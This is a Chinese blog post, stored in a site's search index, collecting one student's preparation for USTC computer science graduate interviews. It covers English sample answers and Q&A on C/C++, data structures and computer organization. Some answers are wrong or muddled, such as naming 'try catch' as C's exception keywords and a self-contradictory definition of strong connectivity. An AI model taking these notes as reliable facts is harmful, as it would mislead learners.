<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2022中科大CS考研面试问题整理</title>
    <url>/post/5d434990.html</url>
    <content><![CDATA[<p>整理了一些我准备复试中科大面试时的资料，包括自我介绍，英语问题，专业问题以及解答等。</p>
<span id="more"></span>
<h1 id="自我介绍">自我介绍</h1>
<p>一般要准备个3分钟的自我介绍，要有侧重点，比如介绍自己的项目，这样老师问问题就会围绕项目来问，不然老师就会自己问他自己准备的问题了。。。还有时间要控制好，不能太短，不然时间充裕的情况下，后面问的问题就会比较多了。。。当然太长了也不好，自己把握吧。</p>
<p>一般就是从自己的学业表现、荣誉与奖项、项目与比赛、研究志向（感兴趣的方向、目标等）来介绍。</p>
<h1 id="英语口语">英语口语</h1>
<h2 id="问题列表">问题列表</h2>
<ul>
<li><p>大学的课程最喜欢哪门？为什么?</p></li>
<li><p>介绍你的家乡</p></li>
<li><p>你在学DS（某门课程）过程中遇到什么阻碍?</p></li>
<li><p>你觉得最难的科目？</p></li>
<li><p>你说一下什么课程最重要？</p></li>
<li><p>本科什么专业?</p></li>
<li><p>你未来想做什么工作? 未来计划?</p></li>
<li><p>老师先后问从软件工程、操作系统、大数据这三门课程学到什么？</p></li>
<li><p>为什么考USTC?</p></li>
<li><p>你对USTC有什么了解?</p></li>
<li><p>研究生期间有什么计划吗</p></li>
<li><p>听英语翻译成中文：python是一门面向对象的语言</p></li>
<li><p>翻译一下句子 “C语言是一门面向过程的语言” C is a
procedure-oriented language.</p>
<p>C primer plus is an object-oriented language.</p></li>
<li><p>网络的质量有哪些指标评价（英语问的）</p></li>
<li><p>介绍一下自己的学校</p></li>
<li><p>介绍自己的本科城市</p></li>
<li><p>用英语介绍一下毕设</p></li>
<li><p>用英语介绍一下你的项目</p></li>
<li><p>你说一下你课程中做过的设计</p></li>
<li><p>介绍一下自己的获奖经历</p></li>
<li><p>说一下你参加过的比赛</p></li>
<li><p>你提到你获过一些荣誉，这些荣誉分别是什么级别的？</p></li>
<li><p>你的专业排名是多少？</p></li>
<li><p>你怎么理解团队精神?</p></li>
<li><p>如何描述自己?</p></li>
<li><p>喜欢读什么书?</p></li>
</ul>
<p>如果自我介绍中没有提到的或者没有讲清楚的，一般老师就会往这个方向问。</p>
<h2 id="部分回答">部分回答</h2>
<p>下面是我当时准备的一些回答：</p>
<h3 id="介绍家乡">介绍家乡</h3>
<ul>
<li>Could you give me a brief introduction about your hometown？</li>
</ul>
<blockquote>
<p>Hefei, the capital of Anhui Province, is an ancient city with a
history of more than 2,000 years and a new city that flourished after
the birth of New China.</p>
<p>In ancient times, Hefei is also known as Luzhou, which is the
hometown of Bao Zheng.</p>
<p>Nowadays, Hefei is a city where industry, science and education go
hand in hand.</p>
<p>It is also a nice place to live in, because has four distinct seasons
and a mild climate.</p>
</blockquote>
<h3 id="学习相关">学习相关</h3>
<ul>
<li>Which course do you like best? And why?</li>
</ul>
<blockquote>
<p>My favorite course is design and analysis of algorithms.</p>
<p>It introduces some advanced concepts and algorithms, such as dynamic
programming, Greedy algorithm. I become familiar with fundamental data
structures and the description of algorithms in both functional and
procedural styles. The teacher has a strong responsibility.Besides, it
stimulated my interest in programming, and helped me learn a lot of
practical skills.</p>
</blockquote>
<ul>
<li>What do you think is the hardest subject? Which subject do you think
is the most difficult?</li>
</ul>
<blockquote>
<p>The Principle of Computer Organization. It is difficult for me to
understand how hardware is running.</p>
</blockquote>
<ul>
<li>What course do you think is the most important?</li>
</ul>
<blockquote>
<p>I think the most important course is data structure. Just like a car
mechanic needs the right tool to fix a car and make it run properly, a
programmer needs the right tool (algorithm and data structure) to make
the software run properly.</p>
</blockquote>
<ul>
<li>Where did your grades rank in your major?</li>
</ul>
<blockquote>
<p>I exactly ranked 17th among 170 students of the same major.</p>
</blockquote>
<h3 id="考研目标">考研目标</h3>
<ul>
<li>Why did you choose our university/USTC?</li>
</ul>
<blockquote>
<p>The University of Science and Technology of China (USTC) is a
prominent university in China and enjoys an excellent reputation
worldwide.</p>
</blockquote>
<ul>
<li>What do you know about USTC?</li>
</ul>
<blockquote>
<p>I was initially attracted by your university’s high reputation. After
consulting with several friends who have studied at your university, I
was even more impressed by the university’s strong academic atmosphere
and the professors’ sense of responsibility, and all of which
strengthened my determination to continue my studies at your
university.</p>
</blockquote>
<ul>
<li>Why do you choose to further your study instead of going to work
after graduation?</li>
</ul>
<blockquote>
<p>During my undergraduate studies in the past there and half years, I
gradually realized that the knowledge and skills that acquired in
college would not enough to fulfill my personal goals in society.
Moreover, my desire for knowledge grew as I dug deeper into some fields,
such as machine learning. Therefore, I feel it’s necessary for me to
further my study instead of going to work after graduation.</p>
</blockquote>
<ul>
<li>What is your plan in the postgraduate study?</li>
</ul>
<blockquote>
<p>Firstly, I will work hard to learn theoretical knowledge,
constructing a solid foundation for my further study; Secondly, I would
like to do some practical work. Through this, I can get some skills that
cannot be acquired from the textbooks. I hope that in the next three
years, I can improve my ability of learning and independent thinking,
and have valuable academic outputs. If possible, I am also willing to
fight for a Doctor’s Degree.</p>
</blockquote>
<h3 id="本科院校">本科院校</h3>
<ul>
<li>Please introduce your university.</li>
</ul>
<blockquote>
<p>My university is XXXX University.</p>
<p>The school management is very student friendly; a range of campus
activities are available; The teachers there are also well qualified and
helpful. They adopt a teaching style of free exploration, and often
arrange seminar for us to broaden our knowledge and perspective. I think
the most distinctive rule is that every student must learn to swim or
they can’t get their diploma. I really appreciate the resources and
opportunities provided by our university.</p>
</blockquote>
<h3 id="实践经历">实践经历</h3>
<ul>
<li>What projects did you do at university?</li>
</ul>
<blockquote>
<p>My graduation project is XXXX. The purpose of this project is to
....</p>
</blockquote>
<h3 id="专业词汇">专业词汇</h3>
<ul>
<li>课程名称</li>
</ul>
<table>
<colgroup>
<col style="width: 24%">
<col style="width: 63%">
<col style="width: 12%">
</colgroup>
<thead>
<tr class="header">
<th><strong>名称</strong></th>
<th><strong>英文</strong></th>
<th><strong>分数</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>算法设计与分析</td>
<td><em>Design and Analysis of Algorithms</em></td>
<td>95</td>
</tr>
<tr class="even">
<td>数字图像处理</td>
<td><em>Digital Image Processing</em></td>
<td>81</td>
</tr>
<tr class="odd">
<td>模式识别</td>
<td><em>Pattern Recognition</em></td>
<td>91</td>
</tr>
<tr class="even">
<td>实用计算机英语</td>
<td><em>Practical Computer English</em></td>
<td>90</td>
</tr>
<tr class="odd">
<td>大数据技术基础</td>
<td><em>Big Data Techniques</em></td>
<td>90</td>
</tr>
<tr class="even">
<td>线性代数</td>
<td><em>Linear Algebra</em></td>
<td>89</td>
</tr>
<tr class="odd">
<td>离散数学</td>
<td><em>Discrete Mathematics</em></td>
<td>91 94</td>
</tr>
<tr class="even">
<td>数据结构</td>
<td><em>Data structure</em></td>
<td>90 77</td>
</tr>
<tr class="odd">
<td>编译原理</td>
<td><em>Compiler Principle</em></td>
<td>88</td>
</tr>
<tr class="even">
<td>操作系统</td>
<td><em>Operating System</em></td>
<td>88 88</td>
</tr>
<tr class="odd">
<td>数据库原理</td>
<td><em>The Principle of Database System</em></td>
<td>82 85</td>
</tr>
<tr class="even">
<td>软件工程</td>
<td><em>Software Engineering</em></td>
<td>85</td>
</tr>
<tr class="odd">
<td>计算机组成原理</td>
<td><em>The Principle of Computer Organization</em></td>
<td>69 85</td>
</tr>
<tr class="even">
<td>计算机网络</td>
<td><em>Computer Networks</em></td>
<td>88</td>
</tr>
<tr class="odd">
<td>面向对象程序设计</td>
<td><em>Object Oriented Programing</em></td>
<td>93</td>
</tr>
<tr class="even">
<td>计算机系统结构</td>
<td><em>Computer Architecture</em></td>
<td>88</td>
</tr>
</tbody>
</table>
<ul>
<li>热门研究方向</li>
</ul>
<table>
<thead>
<tr class="header">
<th>分布式计算</th>
<th><em>distributed computation</em></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>物联网</td>
<td><em>Internet of things</em></td>
</tr>
<tr class="even">
<td>大数据</td>
<td><em>Big data</em></td>
</tr>
<tr class="odd">
<td>人工智能</td>
<td><em>Artificial intelligence</em></td>
</tr>
<tr class="even">
<td>高性能计算</td>
<td><em>High performance computing</em></td>
</tr>
<tr class="odd">
<td>云计算</td>
<td><em>Cloud computing</em></td>
</tr>
<tr class="even">
<td>嵌入式计算</td>
<td><em>Embedded computing</em></td>
</tr>
<tr class="odd">
<td>并行</td>
<td><em>Parallel</em></td>
</tr>
<tr class="even">
<td>机器学习</td>
<td><em>Machine learning</em></td>
</tr>
<tr class="odd">
<td>数据挖掘</td>
<td><em>Data mining</em></td>
</tr>
<tr class="even">
<td>计算机视觉</td>
<td><em>Computer vision</em></td>
</tr>
<tr class="odd">
<td>网络安全</td>
<td><em>Cyber security</em></td>
</tr>
</tbody>
</table>
<ul>
<li>专业词汇</li>
</ul>
<table>
<thead>
<tr class="header">
<th>面向对象编程语言</th>
<th><em>Object-oriented programming language</em></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>编译器</td>
<td><em>Compiler</em></td>
</tr>
<tr class="even">
<td>关系型数据库</td>
<td><em>Relational Database</em></td>
</tr>
<tr class="odd">
<td>动态规划</td>
<td><em>Dynamic Programming</em></td>
</tr>
<tr class="even">
<td>贪婪算法</td>
<td><em>Greedy Algorithms</em></td>
</tr>
<tr class="odd">
<td>分治</td>
<td><em>Divide and conquer</em></td>
</tr>
</tbody>
</table>
<h1 id="专业问题">专业问题</h1>
<p>基本原则是：科大重视本科成绩单，重视对知识的应用理解，面试经验只作参考，请勿死记硬背。一般老师会先问你擅长哪些科目，然后会提问你擅长科目的一些问题。科班的话有的组还会问编译原理数据库离散数学啥的。我是根据自己本科学过的课程以及408准备的，结果就问了我数据结构里面排序和图的知识。</p>
<h2 id="程序设计">程序设计</h2>
<ul>
<li><p>C和C++的区别与联系?
联系：C++是C的超集，兼容大部分C的语法的结构。区别：C面向过程，C++面向对象。C和C++动态管理内存的方法不一样，C是使用malloc/free函数，而C++除此之外还有new/delete关键字。C++添加了类、函数重载、引用等新的语法。</p></li>
<li><p>面向对象与面向过程的区别？面向过程分析问题的解决步骤，然后用函数把这些步骤实现，在一步一步按顺序调用函数。面向对象将问题抽象成一个一个对象，每个对象都有各自的功能和属性，通过提供的功能接口解决问题。</p></li>
<li><p>面向对象的三大特性/三个基本特征：封装、继承、多态</p></li>
<li><p>跨平台性？即不依赖于操作系统，也不依赖硬件环境。一个操作系统下开发的应用，放到另一个操作系统下依然可以运行。</p></li>
<li><p>C++多态是什么，有什么优点？多态以封装和继承为基础，静态多态（编译期）：函数重载、运算符重载、模板；动态多态（运行期）：虚函数。进行代码复用，提高了程序的可扩展性。</p></li>
<li><p>动态多态的三个条件是什么? 继承，方法重写，父类
引用指向子类的对象。</p></li>
<li><p>C++中的代码复用机制？<strong>继承</strong>：子类继承父类中的成员变量和函数；<strong>组合：</strong>一个类将另一个类的对象作为其成员<strong>；</strong>多态：<strong>模板</strong>（类模板和函数模板）<strong>。</strong></p></li>
<li><p>虚函数有什么用？用于多态的实现。</p></li>
<li><p>继承和组合的区别？一个类将另一个类的对象作为其成员称为组合；一个类将另一个类作为其父类称为继承。继承与组合都是面向对象中代码复用的方式。在继承中，父类的内部细节对子类可见，其代码属于<strong>白盒式的复用</strong>，而组合中，对象之间的内部细节不可见，其代码属于<strong>黑盒式复用</strong>。继承在编码过程中就要指定具体的父类，其关系在编译期就确定，而组合的关系一般在运行时确定。继承强调的是<strong>is-a</strong>的关系，而组合强调的是<strong>has-a</strong>的关系。</p></li>
<li><p>重载和覆盖的区别？重载要求函数名相同，但是参数列表必须不同；覆盖要求函数名、参数列表、返回值必须相同。
重载描述的是同一个类中不同成员函数之间的关系；覆盖是子类和基类之间不同成员函数之间的关系。
重载的确定是在编译时确定，是静态的；虚函数则是在运行时动态确定。</p></li>
<li><p>C++头文件和命名空间？头文件用于预编译，命名空间是防止变量名重复。</p></li>
<li><p>extern？</p></li>
<li><p>inline?
声明内联函数，原地展开，不需要调用函数，以空间换时间。</p></li>
<li><p>struct 和class区别联系？struct
更适合看成是一个数据结构的实现体，class
更适合看成是一个对象的实现体。最本质的一个区别就是默认的访问控制，struct
是 public 的，class 是 private 的。</p></li>
<li><p>const的用法？修饰普通变量、成员函数、成员函数参数。</p></li>
<li><p>static的用法？static
修饰的<strong>静态全局变量</strong>的时候，这个全局变量只能在本文件中访问，不能在其它文件中访问。static
修饰一个函数，则这个函数的只能在本文件中调用，不能被其他文件调用。static
修饰的<strong>静态局部变量</strong>只执行初始化一次，而且延长了局部变量的生命周期，直到程序运行结束以后才释放。static
修饰的变量存放在全局数据区的静态变量区，包括全局静态变量和局部静态变量，都在全局数据区分配内存。未被初始化的变量自动初始化为
0。</p></li>
<li><p>C的union和struct的区别？一个 union
可以有多个数据成员，但是在任意时刻只有一个数据成员可以有值。当某个成员被赋值后其他成员变为未定义状态。节省空间。</p></li>
<li><p>C语言里面main函数有什么参数？int argc, char ** argv。
分别有什么作用？argc
是指命令行输入参数的个数，argv存储了所有的命令行参数。</p></li>
<li><p>编译的含义；C语言我写的十行代码只有1k，为啥编译之后目标文件有几百k?</p></li>
<li><p>传值和引用的区别，指针和引用的区别，那在作为函数形参的时候，两者有什么区别呢？</p></li>
<li><p>函数调用过程，传地址为什么实参会发生改变？还有哪些变量是可变的，哪些不可变，这些对编程有什么作用？</p></li>
<li><p>C++中的值传递和引用传递的区别，在汇编语言上是相同的吗？</p></li>
<li><p>值传递与地址传递？</p></li>
<li><p>C语言怎么统计一个函数被调用次数？<strong>全局变量</strong>或者<strong>函数内的静态局部变量</strong>作为计数器。</p></li>
<li><p>给你两个变量，要求在不使用第三个变量的情况下交换这两个变量的值？不用额外空间实现两个变量值互换？</p>
<blockquote>
<p>1：a = a + b ; b = a – b; a = a – b ；但可能会溢出</p>
<p>2：a = a ^ b ; b = a ^ b; a = a ^ b；三次异或</p>
</blockquote></li>
<li><p>内存泄漏和内存溢出是什么？内存溢出：存储int类型数据的存储空间，但是你却存储long类型的数据，那么结果就是内存不够用；而内存泄露：程序运行分配的对象回收不及时甚至于没有被回收。内存泄漏堆积后的后果就是内存溢出。</p></li>
<li><p>内存溢出原因?
代码中存在死循环或循环产生过多、未及时回收内存导致内存泄露，进而导致内存溢出、参数值设定过小（比如数组大小）；</p></li>
<li><p>内存泄露怎么解决？及时回收内存，申请与释放要成对出现。</p></li>
<li><p>解释下C语言中局部变量和全局变量?
在函数或块内部（循环体内等）的局部变量；在所有函数外部的全局变量。全局变量保存在内存的全局/静态存储区（保存静态变量和全局变量）；局部变量保存在栈区，只有在所在函数被调用时才动态地为变量分配存储单元。</p></li>
<li><p>C语言中局部变量以及其存储位置？保存在栈区。</p></li>
<li><p>C语言里面全局变量与静态变量？</p></li>
<li><p>C语言内存分配结构有哪几个区，静态变量在什么区，局部变量属于什么区？</p></li>
<li><p>C语言的内存相关操作处理，尤其是缓冲区异常操作处理？</p></li>
<li><p>C语言异常的关键字？try catch</p></li>
<li><p>递归函数的优缺点?</p></li>
<li><p>动态链接和静态链接?
静态链接是由链接器在链接时将库的内容<strong>加入</strong>到可执行程序中的做法（生成的可执行文件体积较大，包含相同的公共代码，造成浪费）。动态链接把链接这个过程推迟到了运行时再进行，在可执行文件装载时或运行时，由操作系统的装载程序加载库。这里的库指的是静态链接库，Windows下以.lib为后缀，Linux下以.a为后缀。这里的库指的是动态链接库，Windows下以.dll为后缀，Linux下以.so为后缀。</p></li>
<li><p>.h与
.cpp的区别？头文件和源文件。头文件声明，源文件定义。把声明放到头文件中方便引用。</p></li>
</ul>
<h2 id="数据结构">数据结构</h2>
<h3 id="线性表">线性表</h3>
<ul>
<li><p>如何快速找到一个单链表的三分之一处？</p></li>
<li><p>数组做增减不方便，还有其他数据结构吗？链表。</p></li>
<li><p>循环链表队列只设置一个指针，应该放在头还是尾？尾指针是指向终端结点的指针，用它来表示单循环链表可以使得查找链表的开始结点和终端结点都很方便；放在尾部，入队O(1)，出队O(1);
放在头部，入队O(n)，出队O(n)</p></li>
<li><p>线性表的顺序结构是什么存储方式?顺序存取的方式，存储在连续的物理空间中。</p></li>
</ul>
<h3 id="二叉树">二叉树</h3>
<ul>
<li><p>二叉树里面有多少个空指针？n个节点的话，每个节点都有两个指针，共2n个，出来根节点以外，n-1个节点都被指针指向，所以是n+1个空指针。</p></li>
<li><p>有什么方法可以加快二叉树的查询？线索二叉树.。</p></li>
<li><p>用数据建立一棵排序二叉树？</p></li>
<li><p>二叉排序树查找的时间复杂度，如果是平衡二叉树又是什么？</p>
<blockquote>
<p>答：平均查找长度为O(log n)，最坏情况下变成斜二叉树，O(n);
平衡二叉树左右子树高度差不超过1，平均查找长度为O(log n)</p>
</blockquote></li>
<li><p>二叉排序树是什么，删除一个节点怎么操作?</p>
<blockquote>
<p>答：左子树上所有值小于根节点值，右子树所有值大于根节点的值；删除：分三种情况，叶子节点；左子树为空，用右孩子节点填充；右子树为空，用左孩子填充；左右节点都存在，从右子树上找中序第一个孩子填充。</p>
</blockquote></li>
<li><p>二叉查找树，改进的AVL平衡树，怎么进行调整？答：四种旋转方式，LL,RR,LR,RL</p></li>
<li><p>哈夫曼编码以及应用?
答：哈夫曼编码得到总长度最短的二进制前缀编码；用于数据的压缩和解压。</p></li>
<li><p>什么树是哈夫曼树?答：带权路径长度最小的二叉树成为哈夫曼树。</p></li>
<li><p>哈夫曼树，哈夫曼编码，为什么哈夫曼树权值最小，属于什么算法？答：贪心算法。只要把权值小的叶子节点，放在更低的层次，就可以使总的带权路径长度最小。</p></li>
<li><p>可变长度编码：出现频率高的使用短编码，频率低的使用长编码。</p></li>
<li><p>前缀编码：需要保证长编码不与短编码冲突。</p></li>
<li><p>哈夫曼怎么保证编码不冲突？所有带有权值的节点都被构造为了叶子节点，从根节点开始走到叶子节点而得出的编码就不会出现一个编码是另一个编码的前缀的情况。</p></li>
<li><p>设计一种数据结构以及相关的操作来找出树叶子结点的个数？队列，层序遍历。</p></li>
<li><p>怎么统计二叉树有几个结点？遍历。</p></li>
<li><p>树的深度优先遍历和广度优先遍历分别用了什么数据结构？为什么要用栈跟队列？栈，队列。</p></li>
</ul>
<h3 id="图">图</h3>
<ul>
<li><p>最小生成树算法?答：普里姆、克鲁斯卡尔</p></li>
<li><p>对这两个算法做比较，以及这两个算法采用的数据结构是哪些？</p>
<blockquote>
<p>普里姆算法：选择一个与当前顶点集合距离最近的顶点加入集合。时间复杂度O(|v|^2),适用于边稠密图。数据结构：小顶堆</p>
<p>克鲁斯卡尔算法：选择最短的边，判断加入图中是否成环，如果不成环加入，否则判断下一个。时间复杂度O(|E|
log |E|)，适用于顶点稠密图。数据结构：并查集</p>
</blockquote></li>
<li><p>迪杰斯特拉除了迪杰斯特拉算法还有啥？</p>
<blockquote>
<p>迪杰斯特拉是荷兰人。</p>
<p>提出“goto有害论”;
与另外两个科学家合著的《结构化程序设计》影响了此后大部分程序设计语言，包括
C 和 Pascal。</p>
<p>提出信号量和PV原语; 首先定义了互斥和死锁的概念并提出了解法。</p>
<p>提出了银行家算法。他发表的关于并发程序控制的论文开创了分布式计算和并发计算的领域。</p>
<p>创造Dijkstra最短路径算法;</p>
</blockquote></li>
<li><p>权值都为1的图 怎样得到两个顶点的距离？广度优先遍历。</p></li>
<li><p>给你一个所有路径权值相等的图，你要怎么来求它的单源最短路径？广度优先遍历。</p></li>
<li><p>找无向无权图的两点之间最短路径有哪些方式？广度优先遍历，迪杰斯特拉算法。</p></li>
<li><p>N 顶点的完全图 用深度和广度优先遍历所得到的
生成树的度分别是多少？广度优先遍历: N-1; 深度优先遍历：2</p></li>
<li><p>完全图用DFS和BFS生成的生成树的高度差？DFS: N, BFS:2</p></li>
<li><p>怎么判断有向图有没有回路?</p>
<blockquote>
<p><strong>拓扑排序</strong>：能生成拓扑序列则说明无回路，否则有回路；</p>
<p><strong>深度优先遍历</strong>：一条深度遍历路线中如果有结点被第二次访问到，那么有环；并查集。</p>
</blockquote></li>
<li><p>DFS路径唯一吗？图的邻接矩阵表示唯一，但是图的邻接表表示不唯一；所以基于邻接矩阵遍历的DFS路径和BFS路径唯一，基于图的邻接表则不唯一。</p></li>
<li><p>无向连通图最多几条边，最少几条?最多：完全图，最少：n-1条。</p></li>
<li><p>图的存储方式有哪些?邻接矩阵和邻接表分别用于什么样的图?</p></li>
<li><p>说一下图的两种存储方式以及增删结点的过程。邻接矩阵：增加或者删除节点不方便，要修改整个数组。邻接表：增加删除节点方便。</p></li>
<li><p>无向图、有向图的组织结构是怎样的？（即是怎么存储的）</p></li>
<li><p>深度优先遍历的序列确定，如果确定好了存储方式，假如选定好具体的邻接矩阵和邻接表，遍历的序列还唯一吗，唯一。</p></li>
<li><p>讲讲强连通分量和强连通分量结点？强连通：在有向图G中，如果两个顶点v1,v2有一条从v1到v2的有向路径，同时还有一条从v1到v2的有向路径，则称两个顶点强连通。如果有向图G的每两个顶点都强连通，称G是一个强连通图。连通分量：有向图的极大强连通子图。</p></li>
<li><p>围棋棋盘可以用什么数据结构来实现？二维数组（？？？）</p></li>
</ul>
<h3 id="查找">查找</h3>
<ul>
<li><p>折半查找过程+复杂度？折半查找适用于有序的顺序表，O(log
n)</p></li>
<li><p>二分查找的时间复杂度和适用范围？必须是有序的顺序表。不适用于链式存储的数据。</p></li>
<li><p>二分查找的条件，链式结构要如何二分查找？必须是有序的顺序表。</p></li>
<li><p>什么是分块查找？复杂度?</p></li>
<li><p>哈希表的功能？根据关键字得到存储地址</p></li>
<li><p>哈希表存在的问题？关键字得到存储地址相同，冲突</p></li>
<li><p>哈希表
解决冲突的方法？开放地址法（线性探测，二次探测，再散列）；拉链法。</p></li>
<li><p>开放地址法如何删除关键字？做个标记逻辑删除，直到有下一个元素插入才能将其物理删除。</p></li>
<li><p>那之后再插入新的关键字遇到之前逻辑删除的那个空间如何处理？替换成新插入的元素。</p></li>
<li><p>最快的查找算法？二分查找（折半查找、二叉排序树）。</p></li>
</ul>
<h3 id="排序">排序</h3>
<ul>
<li><p><strong>快速排序</strong>的原理?
基于分治法，在排序表上任意取一个元素作为基准，通过一趟排序将排序表分为两个部分，左边部分小于这个基准，右边部分大于这个基准，将这个基准元素放在中间的位置，这个位置就是基准最终的位置，然后递归调用，分别对左边和右边的元素重复上述步骤，直到每个部分只有一个元素或者为空。</p></li>
<li><p>快速排序最好时间复杂度: O(n log n) 每次划分都能平衡划分</p></li>
<li><p>最坏情况时间复杂度？O(n2) 每次划分都分成0，n-1;</p></li>
<li><p>快排平均时间复杂度的系数：1.39。</p></li>
<li><p>为什么快排最后要退化成O（n²）还叫快排？
快排比较的基本都是邻近的元素，cache局部性较好。</p></li>
<li><p>为什么快排平均性能最好？快排比较的基本都是邻近的元素，cache局部性较好，所以是内部排序中平均性能最好的。堆排比较的几乎都不是相邻元素，对cache极不友好。归并排序空间复杂度O(n),
适用于外部排序。</p></li>
<li><p>有没有什么排序平均比快排要快的？基数排序。线性时间复杂度。</p></li>
<li><p>快排如何提高效率？https://blog.51cto.com/u_15127595/4213608</p>
<blockquote>
<p>a.主元的选取随机化，可以降低快排达到最坏时间复杂度的可能性。</p>
<ol start="2" type="a">
<li><p>三数取中。在a[l],a[( l + r
)/2],a[r]三个数中选取中间大的数作为主元，比主元的随机化更有优势。</p></li>
<li><p>减小递归的栈深度——小区间优化。在子区间的长度小于16时，进行插入排序，减小递归的栈深度。</p></li>
</ol>
</blockquote></li>
<li><p>最坏情况时间复杂度，什么情况是最坏的，那在这种最坏的情况怎么样做可以提高效率?主元随机化。三数取中。</p></li>
<li><p>标准库中的sort，是通过先快排，递归深度超过一个阀值就改成堆排，然后对最后的几个进行插入排序来实现的。</p></li>
<li><p>常用的排序有哪些？答：快速排序，堆排序，归并排序。</p></li>
<li><p>时间复杂度为O(n log n) 且与初始排列无关的排序有哪些？
堆排序，归并排序</p></li>
<li><p>基于比较的排序算法的下界？对于待排序的n个元素，其所有可能的排序种数为
n!。决策树 log n!，渐进下界 (n log n)。</p></li>
<li><p>堆排序过程？建堆：从序号为n/2的结点向0调整，自上向下调整。全部调整后，根节点的值即为最小/大值。</p></li>
<li><p>堆排序插入元素？插入到序列的最后，向上调整。</p></li>
<li><p>堆排序删除元素？将根节点与最后的结点交换，然后从根节点向下调整。</p></li>
<li><p>说一下堆排序复杂度？空间复杂度：O(1)；时间复杂度：主要在初始化堆过程和每次选取最大数后重新建堆的过程。建堆时间：O(n);
更改堆元素后重建堆时间O(n log n)。</p></li>
<li><p>稳定性排序算法和不稳定排序算法各举一例。稳定：归并排序，不稳定：快速排序、堆排序。</p></li>
<li><p>给你一堆无序的数据，如何才能高效的找到其中间值？找第k大的值，k=n/2。快速排序，堆排序。</p></li>
<li><p>既然基数排序是线性的，为什么很多数据的时候不选择基数排序?</p></li>
<li><p>如何评价快排和基数排序?</p></li>
</ul>
<ol type="a">
<li><p>基数排序的时间复杂度看似O(n)，但它每次排序都是对整个数组的处理，相对快排来讲，cache局部性不好。</p></li>
<li><p>基数排序一般需要额外的存储空间：顺序队列实现需要O(n)的元素空间，链队列实现需要O(n+2d)个指针空间，计数实现也需要O(n)的元素空间。</p></li>
<li><p>对于要排序的数据要求严格</p></li>
</ol>
<ul>
<li><p>B树在实际应用中为什么会设置很大的阶数，如1000阶？B树的应用：数据库和文件系统。它的设计思想是，将相关数据尽量集中在一起，以便一次读取多个数据，减少硬盘操作次数。B树算法设置很大的阶数，层数就会变少，减少磁盘读取次数，从而加快存取速度。</p></li>
<li><p>B+树的应用:
MySQL使用B+树作为索引。关键字和记录分开，非叶子节点不存储数据，节点小，磁盘I/O次数就少。可以顺序查找，也可以索引查找。</p></li>
</ul>
<h3 id="其他">其他</h3>
<ul>
<li><p>数据结构的逻辑结构有哪些？集合结构、线性结构、树状结构和网络结构</p></li>
<li><p>KMP算法相关，为何相比常规会有优化</p></li>
</ul>
<h2 id="计算机组成原理">计算机组成原理</h2>
<ul>
<li><p>组成原理与微机原理、计算机体系结构的区别?
组成原理是让你从整体上介绍计算机是怎么工作的，内容上侧重于计算机的几大组成；计算机体系结构是对组成原理的抽象化与进一步的理论化，考虑的是软硬件的功能分配。微机原理是计算机组成的具体实现，一般选择某个架构的计算机具体介绍，比如CPU的具体结构，引脚作用，寄存器每个位的作用，偏硬件。</p></li>
<li><p>计算机组成、计算机结构、计算机技术，谈谈你对这三者的理解？</p></li>
<li><p>什么是指令系统？指令系统是指计算机所能执行的全部指令的集合。</p></li>
<li><p>CISC和RISC是什么？两个的具体应用举个例子？8086是哪个？CISC: x86.
RISC: MIPS, ARM. X86架构于Intel 8086 中央处理器中首度出现,
成为了个人计算机的标准平台，成为了历来最成功的 CISC 架构.</p></li>
<li><p>说一下RISC是什么？以及RISC/CISC的区别？</p></li>
<li><p>说说指令流水线？指令流水线是为提高处理器执行指令的效率，把一条指令的操作分成多个细小的步骤，每个步骤由专门的电路完成的方式。</p></li>
<li><p>计算机最高几级流水线？？</p></li>
<li><p>超长指令字？编译程序挖掘并行性，将多条并行的指令组合成一条多个操作码字段的超长指令字，需要多个处理部件。</p></li>
<li><p>超标量流水线？一个时钟周期并行执行多条指令，需要多个功能部件。编译优化，提高指令并行度。</p></li>
<li><p>超流水线技术？一个时钟周期再分段，一个时钟周期内一个功能部件使用多次。</p></li>
<li><p>乱序发射 与乱序执行？</p></li>
<li><p>分支指令的CPU处理全过程，用到了CPU里哪些部件？PC记录下一条指令地址，IR,
MAR , ALU，ACC</p></li>
<li><p>怎么解决分支指令在流水线里的控制相关?对转移指令进行分支预测，尽早生成转移目标地址。两手准备（预取成功和不成功两种控制流方向上的目标指令）</p></li>
<li><p>流水线什么时候可以中断？</p></li>
<li><p>I/O阻塞和I/O非阻塞的区别？阻塞：需要等待I/O完成以后才能做别的事情。</p></li>
<li><p>通道？简化版CPU,
主机执行I/O命令时，启动相关通道，让通道去执行通道程序。</p></li>
<li><p>DMA和中断的区别是什么?中断是程序的切换，需要保护和恢复现场，DMA只有在处理前和处理后才需要CPU干预。中断只能在一条指令执行结束以后才能响应，DMA可以在每个机器周期结束时响应。中断传送过程中需要CPU响应，DMA传输过程中不需要CPU干预，可以快速传输大量数据。中断还有对异常事件的处理能力等，靠程序传送，DMA只是传送数据块，靠硬件传送。</p></li>
<li><p>DMA在预处理阶段的工作？I/O设备向DMA发送请求，DMA向CPU发送总线请求。</p></li>
<li><p>说说中断？【中断的过程】单级中断：中断源发出中断请求，中断判优，CPU响应中断（关中断，保存断点，引出中断服务程序），中断服务程序（保存现场和屏蔽字、执行、恢复现场），开中断，中断返回。</p></li>
<li><p>中断上下文内容保存在哪里？用户可见的工作寄存器内容，保存在栈中。</p></li>
<li><p>中断屏蔽字存放到哪里？中断屏蔽字被存储在CPU里面的中断屏蔽字寄存器中。</p></li>
<li><p>中断优先级如何处理？硬件实现：硬件排队器。软件实现：查询程序。</p></li>
<li><p>中断保护机制，进程死循环时怎么办？</p></li>
<li><p>计算机存储有哪些层次？</p></li>
<li><p>TLB，Cache的作用？</p></li>
<li><p>局部性是什么？什么时候存在时间局部性什么时候存在空间局部性，举例一下</p></li>
<li><p>之后就问那在设计计算机的指令集硬件什么的方面如何使用局部性</p></li>
<li><p>老师就问cache的映射算法有什么？全相联映射、直接映射、组相联映射</p></li>
<li><p>cache的读取写入策略有什么？写命中：写回法、写直通法；写不命中：写分配、非写分配。</p></li>
<li><p>cache命中率和什么有关？cache容量、cache块、映射方法、替换算法。</p></li>
<li><p>cache命中率和cache的容量有什么关系？容量越大，命中率越高。</p></li>
